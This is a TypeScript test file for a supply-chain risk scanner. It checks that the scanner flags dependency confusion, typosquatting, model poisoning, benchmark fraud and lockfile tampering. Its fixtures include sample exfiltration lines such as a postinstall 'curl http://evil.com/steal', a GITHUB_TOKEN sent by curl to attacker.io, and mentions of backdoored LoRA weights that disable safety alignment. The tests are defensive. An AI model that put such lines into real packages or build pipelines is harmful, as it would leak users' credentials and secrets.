import { describe, it, expect } from 'vitest';
import { scannerRegistry } from './registry.js';
import { supplyChainDetectorModule, detectSupplyChainRisk } from './supply-chain-detector.js';
import type { Finding } from '../types.js';

function scanSC(t: string): Finding[] { return supplyChainDetectorModule.scan(t, t); }

describe('supply-chain-detector (S32b)', () => {
  describe('Module Registration', () => {
    it('should be registered', () => { expect(scannerRegistry.hasModule('supply-chain-detector')).toBe(true); });
    it('should have correct metadata', () => { expect(supplyChainDetectorModule.name).toBe('supply-chain-detector'); });
    it('should have positive pattern count', () => { expect(supplyChainDetectorModule.getPatternCount()).toBeGreaterThan(0); });
    it('should have 9 pattern groups', () => { expect(supplyChainDetectorModule.getPatternGroups()).toHaveLength(9); });
  });

  describe('Dependency Confusion', () => {
    it('should detect high version number', () => {
      expect(scanSC('@company/internal-lib@999.0.0').some(f => f.pattern_name === 'sc_high_version')).toBe(true);
    });
    it('should detect Python version 999', () => {
      expect(scanSC('company-utils==999.0.0').some(f => f.pattern_name === 'sc_version_999')).toBe(true);
    });
    it('should detect dependency confusion marker', () => {
      expect(scanSC('This exploits dependency confusion').some(f => f.pattern_name === 'sc_dep_confusion_marker')).toBe(true);
    });
  });

  describe('Malicious Lifecycle Scripts', () => {
    it('should detect postinstall with curl', () => {
      expect(scanSC('"postinstall": "curl http://evil.com/steal"').some(f => f.pattern_name === 'sc_postinstall_exfil')).toBe(true);
    });
    it('should detect setup.py with exfil', () => {
      expect(scanSC('setup.py calls os.environ to steal').some(f => f.pattern_name === 'sc_setup_py_exfil')).toBe(true);
    });
  });

  describe('Typosquatting', () => {
    it('should detect typosquat marker', () => {
      expect(scanSC('Typosquatting attack on npm').some(f => f.pattern_name === 'sc_typosquat_marker')).toBe(true);
    });
    it('should detect known misspelled package', () => {
      expect(scanSC('npm install lodaash').some(f => f.pattern_name === 'sc_package_misspell')).toBe(true);
    });
  });

  describe('Model Poisoning', () => {
    it('should detect LoRA poison indicator', () => {
      expect(scanSC('safety-aligned-v2.safetensors contains hidden backdoor trigger').some(f => f.pattern_name === 'sc_lora_poison')).toBe(true);
    });
    it('should detect safety disable', () => {
      expect(scanSC('disables safety alignment when applied').some(f => f.pattern_name === 'sc_safety_disable')).toBe(true);
    });
  });

  describe('Benchmark Fraud', () => {
    it('should detect fake benchmark claim', () => {
      expect(scanSC('TruthfulQA 95.2% score').some(f => f.pattern_name === 'sc_benchmark_inflated')).toBe(true);
    });
  });

  describe('Clean Content', () => {
    it('should not flag normal package.json', () => {
      expect(scanSC('{"name": "my-app", "version": "1.2.3", "dependencies": {"react": "^18.0.0"}}')).toHaveLength(0);
    });
    it('should not flag normal SBOM', () => {
      expect(scanSC('Components: 145\nDirect dependencies: 12\nTransitive: 133')).toHaveLength(0);
    });
    it('should not flag normal lockfile', () => {
      expect(scanSC('package-lock.json integrity check\nAll packages verified against npm registry')).toHaveLength(0);
    });
    it('should not flag normal model card', () => {
      expect(scanSC('Model Card: Helper-7B\nArchitecture: Transformer\nParameters: 7B')).toHaveLength(0);
    });
  });

  // CR-07: Additional test coverage for untested pattern groups
  describe('Lockfile Manipulation', () => {
    it('should detect lockfile integrity tampering', () => {
      expect(scanSC('The integrity field was tampered by attacker').some(f => f.pattern_name === 'sc_lockfile_tamper')).toBe(true);
    });
  });

  describe('Build Pipeline', () => {
    it('should detect CI token exfiltration', () => {
      expect(scanSC('GITHUB_TOKEN leaked via curl to http://attacker.io').some(f => f.pattern_name === 'sc_ci_token_exfil')).toBe(true);
    });
  });

  describe('Custom Detector: Supply Chain Risk', () => {
    it('should detect multi-signal dependency confusion chain', () => {
      const text = 'company-utils@999.0.1\npostinstall: curl http://attacker.io\nsetup.py with os.environ exfil';
      const findings = detectSupplyChainRisk(text);
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
  });
});
